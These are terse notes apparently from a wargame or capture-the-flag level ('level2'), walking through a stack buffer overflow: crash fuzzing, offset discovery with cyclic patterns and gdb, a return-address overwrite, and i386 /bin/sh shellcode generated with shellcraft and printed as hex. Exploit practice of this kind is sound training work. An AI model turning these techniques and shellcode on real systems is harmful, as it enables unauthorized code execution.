


first step checking if the binary vulnerable or not

python -c 'print "A" * 100' | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

find where exactly does it crash

./pattern create 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

SIGSEGV in 0xb7ea4478 in ??



run <<< $(python -c 'print ("-" * 80 + "AAAA")')

"\x08\x04\x84\xe2"[::-1]

$(python -c 'print "-" * 80 + "\x08\x04\x84\xe2"[::-1] ')

there is no system() therefore no shell to jump to

cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Segmentation fault. 
0x61616175

unhex 61616175 | rev ; echo ""

uaaa

cyclic -l uaaa
80

manually calculating the distance between the buffer start address and the EIP

brek at  0x080484f2 <+30>:    mov    0x4(%ebp),%eax

 run <<< "AAAAAAAAAAAAAAAAAAAAAAAAAAAA"
 
info frame

eip at 0xbffff71c

(gdb) x/40wx $esp

0xbffff6b0:     0xbffff6cc      0x00000000      0x00000000      0xb7e5ec73

0xbffff6c0:     0x080482b5      0x00000000      0x00ca0000      0x41414141

(gdb) p/x 0xbffff6c0 + 12

$1 = 0xbffff6cc

(gdb) x 0xbffff6cc

0xbffff6cc:     0x41414141

(gdb) p/d 0xbffff71c - 0xbffff6cc

$3 = 80

shellcraft i386.linux.sh

6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80

python3 -c 'import struct; print(struct.pack(">L", 0x44840408))'





